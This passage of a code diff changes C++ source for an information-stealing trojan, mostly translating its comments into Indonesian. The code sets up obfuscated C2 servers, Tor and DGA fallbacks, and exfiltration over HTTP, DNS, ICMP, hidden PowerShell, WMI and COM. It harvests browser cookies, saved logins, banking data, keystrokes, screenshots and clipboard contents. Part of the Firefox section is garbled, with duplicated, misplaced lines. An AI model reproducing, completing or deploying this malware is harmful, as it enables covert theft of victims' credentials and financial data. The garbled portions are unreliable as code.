+                // tambah titik setiap 32 karakter
                 if ((j + 5) % 32 == 0 && j + 5 < chunkSize) {
                     query[queryLen++] = '.';
                 }
             }
             
-            // Add domain
+            // tambah domain
             const char* domain = "example.com";
             strcpy_s(query + queryLen, sizeof(query) - queryLen, domain);
             queryLen += strlen(domain);
             
-            // Send DNS query
+            // kirim query DNS
             if (sendto(sock, query, queryLen, 0, (sockaddr*)&dnsServer, sizeof(dnsServer)) == SOCKET_ERROR) {
                 closesocket(sock);
                 WSACleanup();
                 return false;
             }
             
-            // Small delay between queries
+            // delay kecil antar query
             Sleep(100);
         }
         
@@ -1266,35 +1288,35 @@ private:
     bool SendICMP(const vector<BYTE>& data) {
         lock_guard<mutex> lock(c2Mutex);
         
-        // This is a simplified ICMP tunneling implementation
-        // In a real scenario, you would use a more sophisticated method
+        // ini implementasi ICMP tunneling sederhana
+        // di skenario nyata, kamu akan menggunakan metode yang lebih canggih
         
         WSADATA wsaData;
         if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return false;
         
-        // Create a raw socket
+        // buat raw socket
         SOCKET sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
         if (sock == INVALID_SOCKET) {
             WSACleanup();
             return false;
         }
         
-        // Set up destination
+        // setup destination
         sockaddr_in dest;
         dest.sin_family = AF_INET;
         dest.sin_port = 0;
         
-        // Use multiple destinations for redundancy
+        // gunakan banyak destination untuk redundancy
         const char* destinations[] = { "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1" };
         int destIndex = rand() % 4;
         dest.sin_addr.s_addr = inet_addr(destinations[destIndex]);
         
-        // Create ICMP packet
-        const size_t maxDataSize = 1400; // Max ICMP data size
+        // buat packet ICMP
+        const size_t maxDataSize = 1400; // ukuran data ICMP maksimum
         for (size_t i = 0; i < data.size(); i += maxDataSize) {
             size_t chunkSize = min(maxDataSize, data.size() - i);
             
-            // Create ICMP header
+            // buat header ICMP
             char packet[1500];
             memset(packet, 0, sizeof(packet));
             
@@ -1308,10 +1330,10 @@ private:
             packet[6] = 0x00; // Sequence (high byte)
             packet[7] = 0x01; // Sequence (low byte)
             
-            // Copy data
+            // copy data
             memcpy(packet + 8, data.data() + i, chunkSize);
             
-            // Calculate checksum
+            // hitung checksum
             unsigned short checksum = 0;
             for (int j = 0; j < 8 + chunkSize; j += 2) {
                 checksum += *(unsigned short*)(packet + j);
@@ -1320,14 +1342,14 @@ private:
             packet[2] = checksum & 0xFF;
             packet[3] = (checksum >> 8) & 0xFF;
             
-            // Send packet
+            // kirim packet
             if (sendto(sock, packet, 8 + chunkSize, 0, (sockaddr*)&dest, sizeof(dest)) == SOCKET_ERROR) {
                 closesocket(sock);
                 WSACleanup();
                 return false;
             }
             
-            // Small delay between packets
+            // delay kecil antar packet
             Sleep(100);
         }
         
@@ -1339,7 +1361,7 @@ private:
     bool SendPowerShell(const vector<BYTE>& data) {
         lock_guard<mutex> lock(c2Mutex);
         
-        // Encode data as base64
+        // encode data sebagai base64
         DWORD dwSize = 0;
         if (!CryptBinaryToStringA(data.data(), data.size(), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &dwSize)) {
             return false;
@@ -1350,11 +1372,11 @@ private:
             return false;
         }
         
-        // Create PowerShell command to exfiltrate data
+        // buat perintah PowerShell untuk exfiltrasi data
         string psCommand = "$data = '" + string(base64Data.begin(), base64Data.end()) + "'; ";
         psCommand += "$bytes = [System.Convert]::FromBase64String($data); ";
         
-        // Add random server selection
+        // tambah pemilihan server random
         uniform_int_distribution<> serverDist(0, primaryC2Servers.size() - 1);
         wstring server = primaryC2Servers[serverDist(gen)];
         
@@ -1363,7 +1385,7 @@ private:
         psCommand += "$web.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'); ";
         psCommand += "$web.UploadData($url, 'POST', $bytes);";
         
-        // Execute PowerShell command
+        // eksekusi perintah PowerShell
         string command = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"" + psCommand + "\"";
         
         STARTUPINFOA si = { sizeof(si) };
@@ -1382,11 +1404,11 @@ private:
     bool SendWMI(const vector<BYTE>& data) {
         lock_guard<mutex> lock(c2Mutex);
         
-        // Initialize COM
+        // inisialisasi COM
         HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
         if (FAILED(hr)) return false;
         
-        // Set COM security levels
+        // set level security COM
         hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, 
                                 RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
         if (FAILED(hr)) {
@@ -1394,7 +1416,7 @@ private:
             return false;
         }
         
-        // Obtain the initial locator to WMI
+        // dapatkan initial locator ke WMI
         IWbemLocator* pLoc = NULL;
         hr = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
         if (FAILED(hr)) {
@@ -1402,16 +1424,16 @@ private:
             return false;
         }
         
-        // Connect to WMI
+        // koneksi ke WMI
         IWbemServices* pSvc = NULL;
-        hr = pLoc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"), NULL, NULL, 0, NULL, 0, 0, 0, &pSvc);
+        hr = pLoc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"), NULL, NULL, 0, NULL, 0, NULL, &pSvc);
         if (FAILED(hr)) {
             pLoc->Release();
             CoUninitialize();
             return false;
         }
         
-        // Set security levels on the proxy
+        // set level security pada proxy
         hr = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, 
                               RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, 
                               NULL, EOAC_NONE);
@@ -1422,7 +1444,7 @@ private:
             return false;
         }
         
-        // Encode data as base64
+        // encode data sebagai base64
         DWORD dwSize = 0;
         if (!CryptBinaryToStringA(data.data(), data.size(), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &dwSize)) {
             pSvc->Release();
@@ -1439,18 +1461,18 @@ private:
             return false;
         }
         
-        // Create WMI class to store data
+        // buat class WMI untuk menyimpan data
         IWbemClassObject* pClass = NULL;
         hr = pSvc->GetObject(_bstr_t(L"Win32_Process"), 0, NULL, &pClass, NULL);
         if (SUCCEEDED(hr)) {
             IWbemClassObject* pInParams = NULL;
             hr = pClass->GetMethod(_bstr_t(L"Create"), 0, &pInParams, NULL);
             if (SUCCEEDED(hr)) {
-                // Add random server selection
+                // tambah pemilihan server random
                 uniform_int_distribution<> serverDist(0, primaryC2Servers.size() - 1);
                 wstring server = primaryC2Servers[serverDist(gen)];
                 
-                // Create PowerShell command to exfiltrate data
+                // buat perintah PowerShell untuk exfiltrasi data
                 string psCommand = "$data = '" + string(base64Data.begin(), base64Data.end()) + "'; ";
                 psCommand += "$bytes = [System.Convert]::FromBase64String($data); ";
                 psCommand += "$url = '" + string(server.begin(), server.end()) + "/data'; ";
@@ -1460,7 +1482,7 @@ private:
                 
                 string command = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"" + psCommand + "\"";
                 
-                // Set input parameters
+                // set parameter input
                 VARIANT varCommand;
                 VariantInit(&varCommand);
                 varCommand.vt = VT_BSTR;
@@ -1469,7 +1491,7 @@ private:
                 hr = pInParams->Put(_bstr_t(L"CommandLine"), 0, &varCommand, 0);
                 VariantClear(&varCommand);
                 
-                // Execute the method
+                // eksekusi method
                 IWbemClassObject* pOutParams = NULL;
                 hr = pSvc->ExecMethod(_bstr_t(L"Win32_Process"), _bstr_t(L"Create"), 0, 
                                       NULL, pInParams, &pOutParams, NULL);
@@ -1480,7 +1502,7 @@ private:
             if (pClass) pClass->Release();
         }
         
-        // Cleanup
+        // cleanup
         pSvc->Release();
         pLoc->Release();
         CoUninitialize();
@@ -1491,11 +1513,11 @@ private:
     bool SendCOM(const vector<BYTE>& data) {
         lock_guard<mutex> lock(c2Mutex);
         
-        // Initialize COM
+        // inisialisasi COM
         HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
         if (FAILED(hr)) return false;
         
-        // Create XML HTTP request
+        // buat XML HTTP request
         IXMLHTTPRequest* pXMLHttp = NULL;
         hr = CoCreateInstance(CLSID_XMLHTTP60, NULL, CLSCTX_INPROC_SERVER, IID_IXMLHTTPRequest, (void**)&pXMLHttp);
         if (FAILED(hr)) {
@@ -1503,11 +1525,11 @@ private:
             return false;
         }
         
-        // Add random server selection
+        // tambah pemilihan server random
         uniform_int_distribution<> serverDist(0, primaryC2Servers.size() - 1);
         wstring server = primaryC2Servers[serverDist(gen)];
         
-        // Open request
+        // buka request
         hr = pXMLHttp->open(_bstr_t(L"POST"), _bstr_t((server + L"/data").c_str()), _variant_t(VARIANT_FALSE));
         if (FAILED(hr)) {
             pXMLHttp->Release();
@@ -1515,7 +1537,7 @@ private:
             return false;
         }
         
-        // Set request headers
+        // set request headers
         hr = pXMLHttp->setRequestHeader(_bstr_t(L"Content-Type"), _bstr_t(L"application/octet-stream"), _variant_t(VARIANT_TRUE));
         if (FAILED(hr)) {
             pXMLHttp->Release();
@@ -1532,7 +1554,7 @@ private:
             return false;
         }
         
-        // Set request body
+        // set request body
         SAFEARRAY* psa = SafeArrayCreateVector(VT_UI1, 0, data.size());
         if (!psa) {
             pXMLHttp->Release();
@@ -1550,7 +1572,7 @@ private:
         varBody.vt = VT_ARRAY | VT_UI1;
         varBody.parray = psa;
         
-        // Send request
+        // kirim request
         hr = pXMLHttp->send(varBody);
         VariantClear(&varBody);
         SafeArrayDestroy(psa);
@@ -1561,12 +1583,12 @@ private:
             return false;
         }
         
-        // Wait for response
+        // tunggu response
         while (pXMLHttp->readyState != 4) {
             Sleep(100);
         }
         
-        // Cleanup
+        // cleanup
         pXMLHttp->Release();
         CoUninitialize();
         
@@ -1592,27 +1614,27 @@ private:
     
 public:
     AdvancedC2Infrastructure() : gen(rd()) {
-        // Initialize C2 servers
+        // inisialisasi server C2
         primaryC2Servers = {
-            OBF("secure-cdn.example.com"),
-            OBF("api-update.example.net"),
-            OBF("content-service.example.org"),
-            L"192.168.1.4" // Added IP 192.168.1.4 as requested
+            OBFW(L"secure-cdn.example.com"),
+            OBFW(L"api-update.example.net"),
+            OBFW(L"content-service.example.org"),
+            L"192.168.1.4" // ditambahkan IP 192.168.1.4 sesuai permintaan
         };
         
         backupC2Servers = {
-            OBF("backup-server.example.xyz"),
-            OBF("fallback-c2.example.info"),
-            OBF("alt-service.example.biz")
+            OBFW(L"backup-server.example.xyz"),
+            OBFW(L"fallback-c2.example.info"),
+            OBFW(L"alt-service.example.biz")
         };
         
         torHiddenServices = {
-            OBF("xyz123abc.onion"),
-            OBF("def456ghi.onion"),
-            OBF("jkl789mno.onion")
+            OBFW(L"xyz123abc.onion"),
+            OBFW(L"def456ghi.onion"),
+            OBFW(L"jkl789mno.onion")
         };
         
-        // Generate encryption keys
+        // generate encryption keys
         encryptionKey = crypto.GenerateRandomKey(32);
         hmacKey = crypto.GenerateRandomKey(32);
         
@@ -1622,24 +1644,24 @@ public:
     bool SendData(const vector<BYTE>& data) {
         lock_guard<mutex> lock(c2Mutex);
         
-        // Encrypt and HMAC data
+        // enkripsi dan HMAC data
         vector<BYTE> encryptedData = EncryptAndHMAC(data);
         
-        // If we have a working C2, try it first
+        // jika kita punya C2 yang bekerja, coba dulu
         if (!currentC2Server.empty() && (time(nullptr) - lastBeaconTime) < 3600) {
             if (SendHTTP(currentC2Server, encryptedData)) {
                 return true;
             }
         }
         
-        // Try primary C2 servers
+        // coba server C2 utama
         for (const auto& server : primaryC2Servers) {
             if (SendHTTP(server, encryptedData)) {
                 return true;
             }
         }
         
-        // Try DGA domains
+        // coba domain DGA
         time_t now = time(nullptr);
         for (int i = 0; i < 3; i++) {
             wstring dga = GenerateDGADomain(now - i * 86400);
@@ -1648,34 +1670,34 @@ public:
             }
         }
         
-        // Try backup C2 servers
+        // coba server C2 backup
         for (const auto& server : backupC2Servers) {
             if (SendHTTP(server, encryptedData)) {
                 return true;
             }
         }
         
-        // Try DNS tunneling
+        // coba DNS tunneling
         if (SendDNS(encryptedData)) {
             return true;
         }
         
-        // Try ICMP tunneling
+        // coba ICMP tunneling
         if (SendICMP(encryptedData)) {
             return true;
         }
         
-        // Try PowerShell
+        // coba PowerShell
         if (SendPowerShell(encryptedData)) {
             return true;
         }
         
-        // Try WMI
+        // coba WMI
         if (SendWMI(encryptedData)) {
             return true;
         }
         
-        // Try COM
+        // coba COM
         if (SendCOM(encryptedData)) {
             return true;
         }
@@ -1686,12 +1708,12 @@ public:
     bool CheckForUpdates() {
         lock_guard<mutex> lock(c2Mutex);
         
-        // Send update request to C2
-        vector<BYTE> updateRequest = { 0x01 }; // Update request command
+        // kirim request update ke C2
+        vector<BYTE> updateRequest = { 0x01 }; // perintah request update
         
         if (SendData(updateRequest)) {
-            // In a real scenario, you would process the response
-            // and update the malware if a new version is available
+            // di skenario nyata, kamu akan memproses response
+            // dan update malware jika versi baru tersedia
             return true;
         }
         
@@ -1701,13 +1723,13 @@ public:
     vector<BYTE> ReceiveCommands() {
         lock_guard<mutex> lock(c2Mutex);
         
-        // Send command request to C2
-        vector<BYTE> commandRequest = { 0x02 }; // Command request command
+        // kirim request perintah ke C2
+        vector<BYTE> commandRequest = { 0x02 }; // perintah request command
         
         if (SendData(commandRequest)) {
-            // In a real scenario, you would process the response
-            // and return the received commands
-            // For now, return empty vector
+            // di skenario nyata, kamu akan memproses response
+            // dan return perintah yang diterima
+            // untuk sekarang, return vector kosong
             return vector<BYTE>();
         }
         
@@ -1716,7 +1738,7 @@ public:
 };
 
 // =====================================================
-// REAL-TIME DATA COLLECTION WITH ANTI-FORENSICS
+// koleksi data real-time dengan anti-forensik
 // =====================================================
 class RealTimeDataCollector {
 private:
@@ -1726,59 +1748,61 @@ private:
     vector<BYTE> encryptionKey;
     SecureCrypto crypto;
     AdvancedC2Infrastructure& c2;
+    random_device rd;
+    mt19937 gen;
     
     void CollectAndExfiltrate() {
         while (running) {
-            // Collect browser data
+            // koleksi data browser
             vector<BYTE> browserData = CollectBrowserData();
             if (!browserData.empty()) {
                 vector<BYTE> encrypted = crypto.EncryptAES_GCM(browserData, encryptionKey, crypto.GenerateRandomNonce());
                 c2.SendData(encrypted);
             }
             
-            // Collect financial data
+            // koleksi data finansial
             vector<BYTE> financialData = CollectFinancialData();
             if (!financialData.empty()) {
                 vector<BYTE> encrypted = crypto.EncryptAES_GCM(financialData, encryptionKey, crypto.GenerateRandomNonce());
                 c2.SendData(encrypted);
             }
             
-            // Collect clipboard data
+            // koleksi data clipboard
             vector<BYTE> clipboardData = CollectClipboardData();
             if (!clipboardData.empty()) {
                 vector<BYTE> encrypted = crypto.EncryptAES_GCM(clipboardData, encryptionKey, crypto.GenerateRandomNonce());
                 c2.SendData(encrypted);
             }
             
-            // Collect screenshots
+            // koleksi screenshot
             vector<BYTE> screenshotData = CollectScreenshot();
             if (!screenshotData.empty()) {
                 vector<BYTE> encrypted = crypto.EncryptAES_GCM(screenshotData, encryptionKey, crypto.GenerateRandomNonce());
                 c2.SendData(encrypted);
             }
             
-            // Collect keystrokes
+            // koleksi keystrokes
             vector<BYTE> keystrokeData = CollectKeystrokes();
             if (!keystrokeData.empty()) {
                 vector<BYTE> encrypted = crypto.EncryptAES_GCM(keystrokeData, encryptionKey, crypto.GenerateRandomNonce());
                 c2.SendData(encrypted);
             }
             
-            // Collect system information
+            // koleksi informasi sistem
             vector<BYTE> systemInfo = CollectSystemInfo();
             if (!systemInfo.empty()) {
                 vector<BYTE> encrypted = crypto.EncryptAES_GCM(systemInfo, encryptionKey, crypto.GenerateRandomNonce());
                 c2.SendData(encrypted);
             }
             
-            // Collect credentials
+            // koleksi kredensial
             vector<BYTE> credentialsData = CollectCredentials();
             if (!credentialsData.empty()) {
                 vector<BYTE> encrypted = crypto.EncryptAES_GCM(credentialsData, encryptionKey, crypto.GenerateRandomNonce());
                 c2.SendData(encrypted);
             }
             
-            // Sleep for a random interval to avoid pattern detection
+            // sleep untuk interval random untuk menghindari deteksi pola
             uniform_int_distribution<> dist(5000, 15000);
             Sleep(dist(gen));
         }
@@ -1788,15 +1812,15 @@ private:
         lock_guard<mutex> lock(collectorMutex);
         vector<BYTE> data;
         
-        // Chrome data
+        // data chrome
         wchar_t* appData;
         size_t len;
-        _wdupenv_s(&appData, &len, OBF("LOCALAPPDATA").c_str());
+        _wdupenv_s(&appData, &len, OBFW(L"LOCALAPPDATA").c_str());
         if (appData) {
-            wstring chromePath = wstring(appData) + OBF("\\Google\\Chrome\\User Data\\Default");
+            wstring chromePath = wstring(appData) + OBFW(L"\\Google\\Chrome\\User Data\\Default");
             
-            // Collect Chrome history
-            wstring historyPath = chromePath + OBF("\\History");
+            // koleksi history chrome
+            wstring historyPath = chromePath + OBFW(L"\\History");
             if (PathFileExistsW(historyPath.c_str())) {
                 ifstream file(to_string(historyPath), ios::binary | ios::ate);
                 if (file) {
@@ -1804,7 +1828,7 @@ private:
                     file.seekg(0, ios::beg);
                     vector<BYTE> buffer(size);
                     if (file.read(reinterpret_cast<char*>(buffer.data()), size)) {
-                        // Add Chrome history marker
+                        // tambah marker history chrome
                         string marker = "Chrome History:";
                         data.insert(data.end(), marker.begin(), marker.end());
                         data.insert(data.end(), buffer.begin(), buffer.end());
@@ -1812,8 +1836,8 @@ private:
                 }
             }
             
-            // Collect Chrome cookies
-            wstring cookiesPath = chromePath + OBF("\\Cookies");
+            // koleksi cookies chrome
+            wstring cookiesPath = chromePath + OBFW(L"\\Cookies");
             if (PathFileExistsW(cookiesPath.c_str())) {
                 ifstream file(to_string(cookiesPath), ios::binary | ios::ate);
                 if (file) {
@@ -1821,7 +1845,7 @@ private:
                     file.seekg(0, ios::beg);
                     vector<BYTE> buffer(size);
                     if (file.read(reinterpret_cast<char*>(buffer.data()), size)) {
-                        // Add Chrome cookies marker
+                        // tambah marker cookies chrome
                         string marker = "Chrome Cookies:";
                         data.insert(data.end(), marker.begin(), marker.end());
                         data.insert(data.end(), buffer.begin(), buffer.end());
@@ -1829,8 +1853,8 @@ private:
                 }
             }
             
-            // Collect Chrome login data
-            wstring loginDataPath = chromePath + OBF("\\Login Data");
+            // koleksi login data chrome
+            wstring loginDataPath = chromePath + OBFW(L"\\Login Data");
             if (PathFileExistsW(loginDataPath.c_str())) {
                 ifstream file(to_string(loginDataPath), ios::binary | ios::ate);
                 if (file) {
@@ -1838,7 +1862,7 @@ private:
                     file.seekg(0, ios::beg);
                     vector<BYTE> buffer(size);
                     if (file.read(reinterpret_cast<char*>(buffer.data()), size)) {
-                        // Add Chrome login data marker
+                        // tambah marker login data chrome
                         string marker = "Chrome Login Data:";
                         data.insert(data.end(), marker.begin(), marker.end());
                         data.insert(data.end(), buffer.begin(), buffer.end());
@@ -1846,8 +1870,8 @@ private:
                 }
             }
             
-            // Collect Chrome bookmarks
-            wstring bookmarksPath = chromePath + OBF("\\Bookmarks");
+            // koleksi bookmarks chrome
+            wstring bookmarksPath = chromePath + OBFW(L"\\Bookmarks");
             if (PathFileExistsW(bookmarksPath.c_str())) {
                 ifstream file(to_string(bookmarksPath), ios::binary | ios::ate);
                 if (file) {
@@ -1855,7 +1879,7 @@ private:
                     file.seekg(0, ios::beg);
                     vector<BYTE> buffer(size);
                     if (file.read(reinterpret_cast<char*>(buffer.data()), size)) {
-                        // Add Chrome bookmarks marker
+                        // tambah marker bookmarks chrome
                         string marker = "Chrome Bookmarks:";
                         data.insert(data.end(), marker.begin(), marker.end());
                         data.insert(data.end(), buffer.begin(), buffer.end());
@@ -1866,22 +1890,22 @@ private:
             free(appData);
         }
         
-        // Firefox data
-        _wdupenv_s(&appData, &len, OBF("APPDATA").c_str());
+        // data firefox
+        _wdupenv_s(&appData, &len, OBFW(L"APPDATA").c_str());
         if (appData) {
-            wstring firefoxPath = wstring(appData) + OBF("\\Mozilla\\Firefox\\Profiles");
-            WIN32_FIND_DATAW findData;
-            wstring searchPattern = firefoxPath + OBF("\\*");
-            HANDLE hFind = FindFirstFileW(searchPattern.c_str(), &findData);
-            if (hFind != INVALID_HANDLE_VALUE) {
+            wstring firefoxPath = wstring(appData) + OBFW(L"\\Mozilla\\Firefox\\Profiles");
+                wstring firefoxPath = wstring(appData) + OBFW(L"\\Mozilla\\Firefox\\Profiles");
+                wstring searchPattern = firefoxPath + OBFW(L"\\*");
+                wstring firefoxPath = wstring(appData) + OBFW(L"\\Mozilla\\Firefox\\Profiles");
+                wstring searchPattern = firefoxPath + OBFW(L"\\*");
                 do {
-                    if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+                                wstring profilePath = firefoxPath + OBFW(L"\\") + findData.cFileName + OBFW(L"\\logins.json");
                         if (wcscmp(findData.cFileName, L".") != 0 && 
                             wcscmp(findData.cFileName, L"..") != 0) {
-                            wstring profilePath = firefoxPath + OBF("\\") + findData.cFileName;
+                            wstring profilePath = firefoxPath + OBFW(L"\\") + findData.cFileName;
                             
-                            // Collect Firefox history
-                            wstring historyPath = profilePath + OBF("\\places.sqlite");
+                            // koleksi history firefox
+                            wstring historyPath = profilePath + OBFW(L"\\places.sqlite");
                             if (PathFileExistsW(historyPath.c_str())) {
                                 ifstream file(to_string(historyPath), ios::binary | ios::ate);
                                 if (file) {
@@ -1889,7 +1913,7 @@ private:
                                     file.seekg(0, ios::beg);
                                     vector<BYTE> buffer(size);
                                     if (file.read(reinterpret_cast<char*>(buffer.data()), size)) {
-                                        // Add Firefox history marker
+                                        // tambah marker history firefox
                                         string marker = "Firefox History:";
                                         data.insert(data.end(), marker.begin(), marker.end());
                                         data.insert(data.end(), buffer.begin(), buffer.end());
@@ -1897,8 +1921,8 @@ private:
                                 }
                             }
                             
-                            // Collect Firefox cookies
-                            wstring cookiesPath = profilePath + OBF("\\cookies.sqlite");
+                            // koleksi cookies firefox
+                            wstring cookiesPath = profilePath + OBFW(L"\\cookies.sqlite");
                             if (PathFileExistsW(cookiesPath.c_str())) {
                                 ifstream file(to_string(cookiesPath), ios::binary | ios::ate);
                                 if (file) {
@@ -1906,7 +1930,7 @@ private:
                                     file.seekg(0, ios::beg);
                                     vector<BYTE> buffer(size);
                                     if (file.read(reinterpret_cast<char*>(buffer.data()), size)) {
-                                        // Add Firefox cookies marker
+                                        // tambah marker cookies firefox
                                         string marker = "Firefox Cookies:";
                                         data.insert(data.end(), marker.begin(), marker.end());
                                         data.insert(data.end(), buffer.begin(), buffer.end());
@@ -1914,8 +1938,8 @@ private:
                                 }
                             }
                             
-                            // Collect Firefox logins
-                            wstring loginsPath = profilePath + OBF("\\logins.json");
+                            // koleksi logins firefox
+                            wstring loginsPath = profilePath + OBFW(L"\\logins.json");
                             if (PathFileExistsW(loginsPath.c_str())) {
                                 ifstream file(to_string(loginsPath), ios::binary | ios::ate);
                                 if (file) {
@@ -1923,7 +1947,7 @@ private:
                                     file.seekg(0, ios::beg);
                                     vector<BYTE> buffer(size);
                                     if (file.read(reinterpret_cast<char*>(buffer.data()), size)) {
-                                        // Add Firefox logins marker
+                                        // tambah marker logins firefox
                                         string marker = "Firefox Logins:";
                                         data.insert(data.end(), marker.begin(), marker.end());
                                         data.insert(data.end(), buffer.begin(), buffer.end());
@@ -1931,8 +1955,8 @@ private:
                                 }
                             }
                             
-                            // Collect Firefox bookmarks
-                            wstring bookmarksPath = profilePath + OBF("\\places.sqlite");
+                            // koleksi bookmarks firefox
+                            wstring bookmarksPath = profilePath + OBFW(L"\\places.sqlite");
                             if (PathFileExistsW(bookmarksPath.c_str())) {
                                 ifstream file(to_string(bookmarksPath), ios::binary | ios::ate);
                                 if (file) {
@@ -1940,7 +1964,7 @@ private:
                                     file.seekg(0, ios::beg);
                                     vector<BYTE> buffer(size);
                                     if (file.read(reinterpret_cast<char*>(buffer.data()), size)) {
-                                        // Add Firefox bookmarks marker
+                                        // tambah marker bookmarks firefox
                                         string marker = "Firefox Bookmarks:";
                                         data.insert(data.end(), marker.begin(), marker.end());
                                         data.insert(data.end(), buffer.begin(), buffer.end());
@@ -1955,13 +1979,13 @@ private:
             free(appData);
         }
         
-        // Edge data
-        _wdupenv_s(&appData, &len, OBF("LOCALAPPDATA").c_str());
+        // data edge
+        _wdupenv_s(&appData, &len, OBFW(L"LOCALAPPDATA").c_str());
         if (appData) {
-            wstring edgePath = wstring(appData) + OBF("\\Microsoft\\Edge\\User Data\\Default");
+            wstring edgePath = wstring(appData) + OBFW(L"\\Microsoft\\Edge\\User Data\\Default");
             
-            // Collect Edge history
-            wstring historyPath = edgePath + OBF("\\History");
+            // koleksi history edge
+            wstring historyPath = edgePath + OBFW(L"\\History");
             if (PathFileExistsW(historyPath.c_str())) {
                 ifstream file(to_string(historyPath), ios::binary | ios::ate);
                 if (file) {
@@ -1969,7 +1993,7 @@ private:
                     file.seekg(0, ios::beg);
                     vector<BYTE> buffer(size);
                     if (file.read(reinterpret_cast<char*>(buffer.data()), size)) {
-                        // Add Edge history marker
+                        // tambah marker history edge
                         string marker = "Edge History:";
                         data.insert(data.end(), marker.begin(), marker.end());
                         data.insert(data.end(), buffer.begin(), buffer.end());
@@ -1977,8 +2001,8 @@ private:
                 }
             }
             
-            // Collect Edge cookies
-            wstring cookiesPath = edgePath + OBF("\\Cookies");
+            // koleksi cookies edge
+            wstring cookiesPath = edgePath + OBFW(L"\\Cookies");
             if (PathFileExistsW(cookiesPath.c_str())) {
                 ifstream file(to_string(cookiesPath), ios::binary | ios::ate);
                 if (file) {
@@ -1986,7 +2010,7 @@ private:
                     file.seekg(0, ios::beg);
                     vector<BYTE> buffer(size);
                     if (file.read(reinterpret_cast<char*>(buffer.data()), size)) {
-                        // Add Edge cookies marker
+                        // tambah marker cookies edge
                         string marker = "Edge Cookies:";
                         data.insert(data.end(), marker.begin(), marker.end());
                         data.insert(data.end(), buffer.begin(), buffer.end());
@@ -1994,8 +2018,8 @@ private:
                 }
             }
             
-            // Collect Edge login data
-            wstring loginDataPath = edgePath + OBF("\\Login Data");
+            // koleksi login data edge
+            wstring loginDataPath = edgePath + OBFW(L"\\Login Data");
             if (PathFileExistsW(loginDataPath.c_str())) {
                 ifstream file(to_string(loginDataPath), ios::binary | ios::ate);
                 if (file) {
@@ -2003,7 +2027,7 @@ private:
                     file.seekg(0, ios::beg);
                     vector<BYTE> buffer(size);
                     if (file.read(reinterpret_cast<char*>(buffer.data()), size)) {
-                        // Add Edge login data marker
+                        // tambah marker login data edge
                         string marker = "Edge Login Data:";
                         data.insert(data.end(), marker.begin(), marker.end());
                         data.insert(data.end(), buffer.begin(), buffer.end());
@@ -2011,8 +2035,8 @@ private:
                 }
             }
             
-            // Collect Edge bookmarks
-            wstring bookmarksPath = edgePath + OBF("\\Bookmarks");
+            // koleksi bookmarks edge
+            wstring bookmarksPath = edgePath + OBFW(L"\\Bookmarks");
             if (PathFileExistsW(bookmarksPath.c_str())) {
                 ifstream file(to_string(bookmarksPath), ios::binary | ios::ate);
                 if (file) {
@@ -2020,7 +2044,7 @@ private:
                     file.seekg(0, ios::beg);
                     vector<BYTE> buffer(size);
                     if (file.read(reinterpret_cast<char*>(buffer.data()), size)) {
-                        // Add Edge bookmarks marker
+                        // tambah marker bookmarks edge
                         string marker = "Edge Bookmarks:";
                         data.insert(data.end(), marker.begin(), marker.end());
                         data.insert(data.end(), buffer.begin(), buffer.end());
@@ -2038,14 +2062,14 @@ private:
         lock_guard<mutex> lock(collectorMutex);
         vector<BYTE> data;
         
-        // Collect banking data from browsers
+        // koleksi data banking dari browser
         wchar_t* appData;
         size_t len;
-        _wdupenv_s(&appData, &len, OBF("LOCALAPPDATA").c_str());
+        _wdupenv_s(&appData, &len, OBFW(L"LOCALAPPDATA").c_str());
         if (appData) {
-            // Chrome banking data
-            wstring chromePath = wstring(appData) + OBF("\\Google\\Chrome\\User Data\\Default");
-            wstring loginDataPath = chromePath + OBF("\\Login Data");
+            // data banking chrome
+            wstring chromePath = wstring(appData) + OBFW(L"\\Google\\Chrome\\User Data\\Default");
+            wstring loginDataPath = chromePath + OBFW(L"\\Login Data");
             if (PathFileExistsW(loginDataPath.c_str())) {
                 ifstream file(to_string(loginDataPath), ios::binary | ios::ate);
                 if (file) {
@@ -2053,7 +2077,7 @@ private:
                     file.seekg(0, ios::beg);
                     vector<BYTE> buffer(size);
                     if (file.read(reinterpret_cast<char*>(buffer.data()), size)) {
-                        // Search for banking-related URLs in the login data
+                        // cari URL terkait banking di login data
                         string bufferStr(buffer.begin(), buffer.end());
                         vector<string> bankingKeywords = {
                             "bank", "paypal", "stripe", "visa", "mastercard", 
@@ -2066,11 +2090,11 @@ private:
                         for (const auto& keyword : bankingKeywords) {
                             size_t pos = bufferStr.find(keyword);
                             if (pos != string::npos) {
-                                // Add banking data marker
+                                // tambah marker data banking
                                 string marker = "Banking Data (" + keyword + "):";
                                 data.insert(data.end(), marker.begin(), marker.end());
                                 
-                                // Extract relevant data around the keyword
+                                // ekstrak data relevan di sekitar keyword
                                 size_t start = max((size_t)0, pos - 100);
                                 size_t end = min(bufferStr.size(), pos + keyword.size() + 100);
                                 string relevantData = bufferStr.substr(start, end - start);
@@ -2081,8 +2105,8 @@ private:
                 }
             }
             
-            // Firefox banking data
-            _wdupenv_s(&appData, &len, OBF("APPDATA").c_str());
+            // data banking firefox
+            _wdupenv_s(&appData, &len, OBFW(L"APPDATA").c_str());
             if (appData) {
                 wstring firefoxPath = wstring(appData) + OBF("\\Mozilla\\Firefox\\Profiles");
                 WIN32_FIND_DATAW findData;
